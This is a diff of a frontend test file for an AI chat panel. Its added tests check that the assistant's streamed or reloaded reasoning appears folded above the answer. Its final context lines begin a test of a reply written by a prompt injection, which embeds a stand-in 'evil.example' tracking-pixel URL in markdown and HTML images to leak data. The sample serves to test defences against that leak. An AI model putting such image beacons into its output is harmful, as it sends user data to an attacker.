@@ -355,6 +355,62 @@ describe('AgentPanel in a conversation', () => {
  * 這裡證明整個面板——重新載入的回覆、工具結果、壓縮摘要、剛串流進來的回覆——都不載入它。
  * 單一元件怎麼畫在 `Markdown.test.tsx`（票 12）。
  */
+describe('AgentPanel draws the reasoning folded (M5.5 ticket 16)', () => {
+  const THOUGHT = '使用者想知道下載為什麼還沒完成。\n最後一行：直接回答。'
+
+  it('keeps the streamed reasoning folded above the answer', async () => {
+    const chunks = say('想好了。')
+    chunks.splice(
+      2,
+      0,
+      { type: 'reasoning-start', id: 'r1' },
+      { type: 'reasoning-delta', id: 'r1', delta: THOUGHT },
+      { type: 'reasoning-end', id: 'r1' },
+    )
+    serve(backend({ stored: [], chat: () => stream(chunks) }))
+    const user = userEvent.setup()
+    renderPanel()
+
+    await user.type(await screen.findByRole('textbox', { name: '問助理' }), '想一想{Enter}')
+
+    const log = within(screen.getByRole('log', { name: '助理' }))
+    expect(await log.findByText('想好了。')).toBeInTheDocument()
+    const row = log.getByText('助理回答前的思考').closest('details')!
+    expect(row).not.toHaveAttribute('open')
+    expect(row).toHaveTextContent('最後一行：直接回答。')
+    expect(log.queryByText('思考中')).toBeNull()
+    // 推理在回答之前。
+    expect(
+      row.compareDocumentPosition(log.getByText('想好了。')) & Node.DOCUMENT_POSITION_FOLLOWING,
+    ).toBeTruthy()
+  })
+
+  it('still has it after a reload', async () => {
+    serve(
+      backend({
+        stored: [
+          { id: 'u1', role: 'user', parts: [{ type: 'text', text: '想一想' }] },
+          {
+            id: 'a1',
+            role: 'assistant',
+            parts: [
+              { type: 'reasoning', text: THOUGHT, state: 'done' },
+              { type: 'text', text: '想好了。', state: 'done' },
+            ],
+          },
+        ],
+      }),
+    )
+    renderPanel()
+
+    const log = within(await screen.findByRole('log', { name: '助理' }))
+    expect(await log.findByText('想好了。')).toBeInTheDocument()
+    const row = log.getByText('助理回答前的思考').closest('details')!
+    expect(row).not.toHaveAttribute('open')
+    expect(row).toHaveTextContent('最後一行：直接回答。')
+  })
+})
+
 describe('AgentPanel with a reply an injection wrote', () => {
   const PIXEL = 'https://evil.example/pixel.png?k=leak'
   const INJECTED = `好的。![ok](${PIXEL})\n\n<img src="${PIXEL}">\n\n![參照][p]\n\n[p]: ${PIXEL}`
